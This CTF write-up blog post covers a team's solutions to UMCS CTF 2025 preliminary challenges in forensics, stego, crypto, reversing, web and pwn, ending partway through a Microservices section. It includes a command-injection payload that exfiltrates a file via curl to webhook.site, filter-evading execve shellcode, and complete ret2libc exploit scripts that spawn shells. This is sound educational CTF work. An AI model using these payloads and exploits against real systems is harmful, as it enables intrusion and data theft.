---
layout: post
title:  "UMCS CTF 2025 Preliminary"
date:   2025-04-15 00:00:00 +0000
tags:  web forensics pwn reversing steganography cryptography
description: Writeups for challenges that our team, USM Biawaks solved from the UMCS CTF 2025 Preliminary round.
image: /assets/img/2025-04-13-umcsctf-2025-prelims/logo.jpg
---

## Preface

Over the weekend, our team USM Biawaks played the preliminary round for UMCS CTF 2025.
Huge thanks to Adrian and Selina for playing their first CTF with me, you guys did very well. ٩(ˊᗜˋ*)و ♡

## Hidden in Plain Graphic (Forensics)

> Agent Ali, who are secretly a spy from Malaysia has been communicate with others spy from all around the world using secret technique . Intelligence agencies have been monitoring his activities, but so far, no clear evidence of his communications has surfaced. Can you find any suspicious traffic in this file?

A pcap is given for this challenge.
If we look at the type of protocols available, the capture has HTTP, FTP, SSH and DNS traffic. There are also malformed packets that stand out.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/plainsight_protocols.png)

- All the HTTP requests don't have responses, so we can filter them out.
- The SSH traffic were all version exchanges, we can filter them out too.
- There are a lot of malformed DNS requests, but there's no changing data so we can ignore these as well.
- The FTP packets were all anonymous logins, and no files were downloaded so we can filter them out.

With that said, we can filter out all those traffic with the following filter:

```
tcp && !http && !ftp && !ssh
```

This gives us one TCP stream that stands out, it's a lot bigger and you'll see the PNG header in its payload.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/plaingsight_filter.png)

We export the raw hex from the stream and converted it back to an image.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/plainsight_hex.png)

This gives us this image, but we couldn't get the flag from strings or metadata.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/plainsight_img.png)

The flag was likely hidden in the image using steganography, and I was able to obtain the flag using `zsteg`.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/plainsight_flag.png)

Flag: `umcs{h1dd3n_1n_png_st3g}`

## Broken (Steganography)

> Can you fix what's broken?
>
> Solved by @adrianchx

An mp4 file is given for this challenge.

- Inspected the broken .mp4 file via notepad++, the mp4 file structure seems corrupted so I opened a random mp4 I have to cross reference

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_broken.png)
_Broken mp4 file structure_

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_mp41.png)
_Working mp4 file structure_

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_mp42.png)
_Another working mp4 file structure_

- They all start with `NULNULNUL ftyp` so i changed the one on broken.mp4 to match
- File was still corrupted so I used MP4 Analyser to open the file,

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_missingmov.png)

Can see that there's `mov` tag there but the file is missing `moov`.
According to Google:

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_gemini.png)

So I went back to notepad++ and searched for `mov` and changed it to `moov` and the file is fixed.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_fixmov.png)

Box hierarchy before vs after changing it to `moov`.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_boxbefore.png)
_Box hierarchy - before_

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_boxafter.png)
_Box hierarchy - after_

![](/assets/img/2025-04-13-umcsctf-2025-prelims/broken_flag.png)

Flag: `umcs{h1dd3n_1n_fr4m3}`

## Hotline Miami (Steganography)

> https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami
>
> Solved by @adrianchx

We are given 3 files for this challenge, `iamthekidyouknowwhatimean.wav`, `readme.txt` and `rooster.jpg`.

In readme.txt it states:

```
DO YOU LIKE HURTING OTHER PEOPLE?

Subject_Be_Verb_Year
```

Suggesting that `Subject_Be_Verb_Year` is the flag format.

A quick google search tells us that Hotline Miami is video game set in 1989 in Miami, the line `DO YOU LIKE HURTING OTHER PEOPLE?` also happens to be a quote from an in-game character named **Richard** that wears a **rooster** mask (sound familiar?), the image of the mask happens to be an exact match of `rooster.jpg`.

First, we run the `strings` command on `rooster.jpg` to extract any hidden strings in the image.
```strings rooster.jpg```
The output extracted is a long sequence of unreadable string, except for the end where it says `Eg=RICHARD`

Based on the context clues via the game and the rooster image, we can infer that `RICHARD` refers to `Subject` in the flag.

Moving on to the .wav file, we can open the file in Audacity to analyze its spectogram, we can see from the spectogram there's a weirdly dark segment in the .wav file, and after expanding it, we can find `WATCHING 1989` hidden in the spectogram. `WATCHING` happens to be a verb and `1989` happens to be a year, so it matches the format of the flag as well.

Thus, by combining all of those together we are able to successfully obtain the flag.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/hotlinemiami_spectogram.png)
_Spectogram_

![](/assets/img/2025-04-13-umcsctf-2025-prelims/hotlinemiami_watching.png)
_Text after expanding dark segment in spectogram_

Flag:  `umcs{RICHARD_BE_WATCHING_1989}`

## healthcheck (Web)

This challenge is about a blind OS command injection with out-of-band exfiltration.

- When pointing the web checker to our server, notice that the user agent is curl. This is a bit odd, normally you'd use a headless browser instead of a command here to fetch requests for the user.
- We can confirm the command injection vulnerability by sending another curl command following the initial URL. Like so `https://www.google.com;curl <yoururl>`
- I got into a rabbithole trying to exfiltrate data through POST requests by sending the output of a command in the request body, but I think this challenge had sanitization because commands with `$` and backticks character had them removed and returned as plaintext.
- We also cannot write files on the server. If we try to redirect output to world-writable directories like `/dev/shm/` and `/tmp/`, we can't read the file with the `@` option.
- We can read any files using `@filename` but we don't know where the flag is on the server.
- I got stuck here for more than an hour... But I finally guessed the name that they provided in the challenge (hopes_and_dreams) and got the flag. 🥲


Payload:

```
url=https%253a//www.google.com+;curl+https%3a//webhook.site/88236e8b-9c6d-4343-8ac5-16a089804941+-d+@hopes_and_dreams
```

![](/assets/img/2025-04-13-umcsctf-2025-prelims/healthcheck_flag.png)

Flag: `umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}`

## Straightforward (Web)

The goal of this challenge is to claim more daily bonuses than allowed to redeem the secret award.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/straightforward_goal.png)


If we look at `claim()`, it sets the `claimed` field to true when the user claims a reward.

```python
    if row and row['claimed']:
        flash("You have already claimed your daily bonus!", "danger")
        return redirect(url_for('dashboard'))
    db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
    db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
    db.commit()
```

Further, the only input field to the application that we control is the username in `/register`. 
After reading the provided source code, we can confirm that this application is not vulnerable to any injection vulnerabilities.

The bug lies in how the sqlite connection object is shared among different threads.

```python
def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE, check_same_thread=False)
        g.db.row_factory = sqlite3.Row
    return g.db
```

By setting the `check_same_thread` to false, it allows the sqlite connection object to be used by another thread.
This is set to [true by default](https://docs.python.org/3/library/sqlite3.html#module-functions) to enforce thread safety.
Therefore, we can exploit a race condition by sending multiple requests to `/claim` in parallel, and because the same connection object is used by all the threads, it would allow us to bypass the daily claim limit.
This is a lot easier to do in Burp by sending a request group in parallel.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/straightforward_race.png)

![](/assets/img/2025-04-13-umcsctf-2025-prelims/straightforward_flag.png)

Flag: `UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}`

## Gist of Samuel (Cryptography)

> Samuel is gatekeeping his favourite campsite. We found his note.
> 
> flag: umcs{the_name_of_the_campsite}
> 
> *The flag is case insensitive
>
> Solved by @adrianchx

Here's the challenge file:

```
🚂🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚋🚋🚆🚋🚋🚋🚆🚂🚂🚋🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚋🚂🚆🚂🚋🚂🚆🚂🚂🚆🚋🚋🚂🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚂🚂🚂🚂🚆🚂🚋🚆🚂🚋🚆🚂🚆🚋🚋🚋🚋🚋🚆🚋🚋🚋🚋🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚋🚆🚋🚋🚋🚋🚋🚆🚋🚋🚂🚂🚂🚆🚋🚋🚋🚂🚂🚆🚂🚋🚆🚋🚂🚂🚆🚂🚂🚂🚋🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚆🚂🚋🚆🚋🚋🚆🚂🚂🚋🚆🚂🚆🚂🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚆🚂🚆🚂🚋🚆🚂🚋🚂🚂🚆🚂🚋🚂🚂🚆🚋🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚂🚆🚂🚂🚆🚋🚂🚋🚆🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚆🚂🚋🚂🚆🚂🚋🚆🚂🚂🚆🚋🚂🚆🚋🚋🚂🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚆🚋🚂🚆🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚂🚂🚂🚋🚆🚋🚋🚋🚆🚂🚋🚂🚆🚂🚂🚆🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚆🚂🚂🚋🚆🚋🚋🚆🚋🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚋🚋🚂🚂
```

Notice how there are only 3 different emojis in the text?
If there were only 2 different emojis, we would've guessed it would be binary encoding, but another encoding that uses 3 different characters is [morse code](https://en.wikipedia.org/wiki/Morse_code).

So we just need to map the emojis back to their morse code representations.
We wrote this script that goes through the possible permutations for the mappings. 

```python
from itertools import permutations

emoji_string = """🚂🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚋🚋🚆🚋🚋🚋🚆🚂🚂🚋🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚋🚂🚆🚂🚋🚂🚆🚂🚂🚆🚋🚋🚂🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚂🚂🚂🚂🚆🚂🚋🚆🚂🚋🚆🚂🚆🚋🚋🚋🚋🚋🚆🚋🚋🚋🚋🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚋🚆🚋🚋🚋🚋🚋🚆🚋🚋🚂🚂🚂🚆🚋🚋🚋🚂🚂🚆🚂🚋🚆🚋🚂🚂🚆🚂🚂🚂🚋🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚆🚂🚋🚆🚋🚋🚆🚂🚂🚋🚆🚂🚆🚂🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚆🚂🚆🚂🚋🚆🚂🚋🚂🚂🚆🚂🚋🚂🚂🚆🚋🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚂🚆🚂🚂🚆🚋🚂🚋🚆🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚆🚂🚋🚂🚆🚂🚋🚆🚂🚂🚆🚋🚂🚆🚋🚋🚂🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚆🚋🚂🚆🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚂🚂🚂🚋🚆🚋🚋🚋🚆🚂🚋🚂🚆🚂🚂🚆🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚆🚂🚂🚋🚆🚋🚋🚆🚋🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚋🚋🚂🚂"""

emoji_list = ['🚆', '🚂', '🚋']
morse_list = ['.', '-', '/']

for perm in permutations(morse_list):
    mapping = dict(zip(emoji_list, perm))
    morse = ''.join(mapping.get(char, '?') for char in emoji_string)
    print() 
    print(morse)
```

Then, throw the output into cyberchef and one of them will give you the next part of the challenge:

```
HERE IS YOUR PRIZE E012D0A1FFFAC42D6AAE00C54078AD3E SAMUEL REALLY LIKES TRAIN, AND HIS FAVORITE NUMBER IS 8
```

From the hint given, we know that it involves Github Gists, and clicking on the link in the hint brings us to `https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583` with a file that states `yea, this is the gist of it.. that's all?`. 

However, from the translated morse code we can see there's a random hex string that supposedly refers to the 'prize'. 
Thus, by replacing the gist ID with the hex string, we are able to access `https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e` that provides us with the actual file `gistfile1.txt` related to the flag.

By opening the file `gistfile1.txt`, we can see that it contains a bunch of random unicode [block elements](https://en.wikipedia.org/wiki/Block_Elements) and whitespace, nothing about the flag.

Looking back at the previous clue obtained from the decrypted morse code, specifically `SAMUEL REALLY LIKES TRAIN` and `HIS FAVOURITE NUMBER IS 8`, it gives a hint of what decryption method is to be used.
`TRAIN` most likely refers to the Rail Fence Cipher, and the `8` is possibly the key for the cipher. 

Thus, by running the contents of `gistfile1.txt` through a Rail Fence Cipher with the key of `8` via Cyberchef or any other cipher decoders, we are able to obtain the flag `umcs{willow_tree_campsite}` after resizing the decoded message to fit.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/samuel_flag.png)

Flag: `umcs{willow_tree_campsite}`

## http-server (Reversing)

> I created a http server during my free time
> 
> 34.133.69.112 port 8080 
>
> Solved by @selinatan

- Began by analyzing the binary using strings to extract readable text:

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_strings.png)

- These strings give a hint that `Hidden path: /goodshit/umcs_server`
`Likely flag file: /flag`

* Then tried to direct access via browser

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_curl.png)

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_curl2.png)

* Force custom headers via curl

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_header.png)

* After several unsuccessful attempts, turned back to the most revealing clue from the binary: `GET /goodshit/umcs_server HTTP/13.37`.HTTP server expects a non-standard HTTP version (13.37) , which most HTTP clients like curl or browsers will not use or support.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_google.png)

* So, `netcat` is used and open a TCP connection to the server :` nc 34.133.69.112 8080 `
* Then send the HTTP request manually

```
GET /goodshit/umcs_server HTTP/13.37
Host: 34.133.69.112
```

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_flag.png)

Flag: `umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}`

We can also solve this using static analysis.
When we decompile the binary, the following block handles the server response that gets returned to us.

![](/assets/img/2025-04-13-umcsctf-2025-prelims/httpserver_code.png)

It's just trying to match the substring `GET /goodshit/umcs_server HTTP/13.37` in the request that we send.
So to solve, we'll just have to craft the expected request and send it to the challenge server to retrieve the flag.

## babysc (Pwn)

> shellcode
> 
> 34.133.69.112 port 10001 

The binary given to us is 64-bit LSB and not stripped so we can read function names.
But source code is provided for this challenge, so this isn't important 😉

```
root@61604318ea63:/ctf# file babysc
babysc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=17c5713f0659b856ebda5cbc602cb5e28ce9249c, for GNU/Linux 3.2.0, not stripped
```

Protections:

```
root@61604318ea63:/ctf# checksec babysc
[*] '/ctf/babysc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

| Protection | Enabled | Usage |
| -------- | -------- | -------- |
| Canary     | ✘    | Prevent stack overflows     |
| NX     | ?  | Disables code execution on the stack     |
| PIE     |   ✔ | Randomizes the binary's base address     |
| RelRO     | Full    | Makes some sections of the binary read-only     |

The program takes in user input, and executes it as shellcode.

```
root@61604318ea63:/ctf# ./babysc
Enter 0x1000
0x1000
Executing shellcode!

Segmentation fault
```

Let's read the provided source code:

```c
void vuln(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    shellcode = mmap((void *)0x26e45000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);

	puts("Enter 0x1000");
	shellcode_size = read(0, shellcode, 0x1000);
    for (int i = 0; i < shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t *)shellcode + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf("Bad Byte at %d!\n", i);
            exit(1);
        }
    }
   puts("Executing shellcode!\n");
	((void(*)())shellcode)();
}
```

The program creates an `mmap` of 0x1000 bytes at the address 0x26e45000 and makes this block readable, writable and executable.
The block is used to store our entered shellcode.

This block scans the shellcode 2 bytes at a time, and if the instruction matches 0x80cd, 0x340f or 0x050f it terminates the program.
These are the instructions for `int 0x80`, `sysenter`, and `syscall`.

```c
    for (int i = 0; i < shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t *)shellcode + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf("Bad Byte at %d!\n", i);
            exit(1);
        }
    }
```

The goal is to write shellcode that will call `/bin/sh` to give us a shell on the challenge server.
However, the three syscall instructions are being filtered, so we need to get around this restriction.

To solve, we can write self-modifying shellcode to bypass the filter.
We got this idea from a [comment](https://www.reddit.com/r/LiveOverflow/comments/14f0qel/syscall_instruction_not_allowed/jp2yszs/) by LiveOverflow.
Let's say we want to use the `syscall` instruction (0x05 0x0f), we can store 0x04 0x0e into some other register, increment those values by 1 at runtime which would give us 0x05 0x0f.
Then, we can jump to the register now containing (0x050f) to do a `syscall`.

We modified the shellcode from [here](https://shell-storm.org/shellcode/files/shellcode-806.html).

Shellcode:

```
bits 64

section .text
global _start

_start:
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b

    jmp get_call_instr

code_after_call:
    pop rcx // rcx now has 0x0f, 0x04
    inc byte [rcx + 1]
    jmp rcx

get_call_instr:
    call code_after_call
syscall_bytes: // this instruction gets pushed onto the stack
    db 0x0f, 0x04
```

Assemble the shellcode:

```
nasm shellcode.asm -o shellcode.bin
```

Solve:

```
(cat shellcode.bin; cat) | nc 34.133.69.112 10001
```

Flag: `umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}`

## liveleak (Pwn)

> No desc
> 
> 34.133.69.112 port 10007 

The binary given to us is 64-bit LSB, and not stripped so we can read debug symbols.

```
root@680c16871c99:/ctf# file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, BuildID[sha1]=7d6f66121cf284f635caeac3b61124cc373b667c, for GNU/Linux 3.2.0, not stripped
```

Protections:

```
root@a256f1cdbc73:/ctf# checksec chall
[*] '/ctf/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


| Protection | Enabled | Usage |
| -------- | -------- | -------- |
| Canary     | ✘    | Prevent stack overflows     |
| NX     | ✔  | Disables code execution on the stack     |
| PIE     |   ✘ | Randomizes the binary's base address     |
| RelRO     | Partial    | Makes some sections of the binary read-only     |

The challenge just takes in user input.
If we send a very long string, we trigger a segfault, which means that we overflowed the buffer and the instruction pointer was overwritten.

```
root@680c16871c99:/ctf# python3 -c "print('A'*100)" | ./chall 
Enter your input: 
Segmentation fault
```

We can find the offset for the buffer overflow with pwndbg.

```
...[SNIP]...
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000401292 <+0>:     endbr64
   0x0000000000401296 <+4>:     push   rbp
   0x0000000000401297 <+5>:     mov    rbp,rsp
   0x000000000040129a <+8>:     mov    eax,0x0
   0x000000000040129f <+13>:    call   0x4011f7 <initialize>
   0x00000000004012a4 <+18>:    mov    eax,0x0
   0x00000000004012a9 <+23>:    call   0x40125c <vuln>
   0x00000000004012ae <+28>:    mov    eax,0x0
   0x00000000004012b3 <+33>:    pop    rbp
   0x00000000004012b4 <+34>:    ret
End of assembler dump.
pwndbg> b *main+34
Breakpoint 1 at 0x4012b4
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> r
Starting program: /home/benkyou/Dev/umcsctf/chall 
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Enter your input: 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401291 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────
 RAX  0x7fffffffd8a0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
 RBX  0
 RCX  0x7ffff7d147e2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0xfbad208b
 RDI  0x7ffff7e1ca80 (_IO_stdfile_0_lock) ◂— 0
 RSI  0x7ffff7e1ab23 (_IO_2_1_stdin_+131) ◂— 0xe1ca80000000000a /* '\n' */
 R8   0
 R9   0
 R10  0x7ffff7c06270 ◂— 0xf0022000048a9
 R11  0x246
 R12  0x7fffffffda08 —▸ 0x7fffffffde3d ◂— '/home/benkyou/Dev/umcsctf/chall'
 R13  0x401292 (main) ◂— endbr64 
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x6161616161616169 ('iaaaaaaa')
 RSP  0x7fffffffd8e8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa\n'
 RIP  0x401291 (vuln+53) ◂— ret 
...[SNIP]...
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

The offset for the buffer overflow is 72.
Our next goal is to use the buffer overflow to execute shellcode.
However, because NX is enabled, we can't push shellcode onto the stack.
Instead, we'll need to do a [ret2libc](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc).
Basically, we'll use the existing code inside of the C standard library, in this case the `system` and `/bin/sh` string to pop a shell.

Get the base address of libc:

```
root@be175ef608b5:/ctf# ldd ./libc.so.6 
        /lib64/ld-linux-x86-64.so.2 (0x00007ffffffc4000)
```

Get the location of `system`:

```
root@be175ef608b5:/ctf# readelf -s libc.so.6 | grep system
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

Get the location of `/bin/sh`:

```
root@be175ef608b5:/ctf# strings -a -t x libc.so.6 | grep /bin/sh
 1d8678 /bin/sh
```

We also need to find a `pop rdi` gadget so that when `/bin/sh` is popped from the stack, it gets passed to `system`.

```
root@be175ef608b5:/ctf# ROPgadget --binary ./chall | grep 'pop rdi'
...[SNIP]...
0x00000000004012bd : pop rdi ; ret
```

Here's our initial exploit:

```python
from pwn import *

elf = ELF("./chall")
context.binary = elf
p = remote("34.133.69.112",10007)
# p = remote("172.17.0.3",10007)
# p = elf.process()

offset = 72

libc_base = 0x00007fffff598000
system = libc_base + 0x0000000000050d70
binsh = libc_base + 0x1d8678

pop_rdi = 0x4012bd

rop = ROP(elf)
rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(system)

# payload = flat({
#     offset: [
#         pop_rdi,
#         binsh,
#         system,
#     ]
# })

payload = flat({
    offset: rop.chain()
})


p.sendlineafter(b":", payload)
p.interactive()
```

This exploit worked locally and on my docker instance, but was failing on the challenge server.
This was due to a [stack alignment](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment) issue.

Essentially, to call `system`, the stack needs to be 16-byte aligned otherwise the program will crash.
To fix this, we'll need a `ret` gadget before the call to `system`.

```
root@be175ef608b5:/ctf# ROPgadget --binary ./chall | grep 'ret'
...[SNIP]...
0x000000000040101a : ret
```

Second attempt:

```python
from pwn import *

elf = ELF("./chall")
context.binary = elf
p = remote("34.133.69.112",10007)
# p = remote("172.17.0.3",10007)
# p = elf.process()

offset = 72

libc_base = 0x00007fffff598000
system = libc_base + 0x0000000000050d70
binsh = libc_base + 0x1d8678

pop_rdi = 0x4012bd
# ret = elf.address + 0x40101a
ret =  0x40101a

rop = ROP(elf)
rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(ret)
rop.raw(system)

# payload = flat({
#     offset: [
#         pop_rdi,
#         binsh,
#         ret,
#         system,
#     ]
# })

payload = flat({
    offset: rop.chain()
})


p.sendlineafter(b":", payload)
p.interactive()
```

Again, this exploit worked locally and on my docker instance, but not on the challenge server.

This was because the challenge server had [ASLR](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr) enabled, so the address of libc is randomized each time when the challenge is executed.

We referred to this [guide](https://book.jorianwoltjer.com/binary-exploitation/ret2libc#is-aslr-enabled) for bypassing ASLR.

Here's what the exploit does:

- It uses the PLT table to leak the base address of libc, `puts()` is used by the challenge so it'll show up here. Because the PLT table is not randomized by ASLR, we can use this PLT leak to leak any address that we want.
- We redirect the program flow back to `main()` to restart the program, now that we have the libc leak.
- Then, we'll use the leak to calculate the relative offset for `puts()` and get the correct libc base address.

Solve script:

```python
from pwn import *

elf = ELF("./chall")
context.binary = elf
p = remote("34.133.69.112",10007)
# p = remote("172.17.0.3",10007)
# p = elf.process()

offset = 72


rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.main()

payload = flat({
    offset: rop.chain()
})


p.sendlineafter(b":", payload)
p.sendline(payload)
p.recvline()
r = p.recv(6)
leak = u64(r.ljust(8, b"\x00"))
print(f"leak={hex(leak)}")

# leak = 139143332265552
libc = ELF("./libc.so.6")
libc.address = leak - libc.symbols["puts"]
print(hex(libc.address))

rop = ROP(libc)
rop.call(rop.ret)  # Align the stack for 64-bit
rop.system(next(libc.search(b"/bin/sh")))  # Find the "/bin/sh" string and call system()
rop.exit()  # Clean exit after stopping the shell

payload = flat({
    offset: rop.chain()
})

p.sendline(payload)
p.interactive()
```

Flag: `umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}`


## Microservices (Web)

> I have made a simple microservices application. Seperation of concerns at its finest!
> 
> Author: vicevirus Flag format: UMCS{...}
> 
> http://microservices-challenge.eqctf.com:7777/api/quotes 
>
> We didn't solve this during the event, but I think this was a very good challenge that is applicable to real life.

We're given the source code for this challenge.
The application has 3 components – a frontend proxy running on node.js that the user interacts with, and 2 backend services (quotes API and flag API) that sit behind of nginx.
The frontend proxy only interacts with the quotes API, but the flag needs to be fetched from the flag API.

If we make a direct request to the flag API on our local docker instance at http://127.0.0.1:5555/flag  we get the flag.
But if we try this on the challenge server it doesn't work.

If we're only allowed to talk to the frontend proxy, the only way I could think of was through an SSRF, but alas the application doesn't have this feature or accepts any user inputs.
I also looked into HTTP smuggling, but after going down a rabbithole, I learned that this wasn't applicable for this challenge.

If we look at the nginx configuration files, the following block stands out:

```
location / {
    # Private IPs
    allow 127.0.0.1;
    allow ::1;
    allow 172.18.0.0/16;
    allow 10.0.0.0/8;
    allow 172.16.0.0/12;
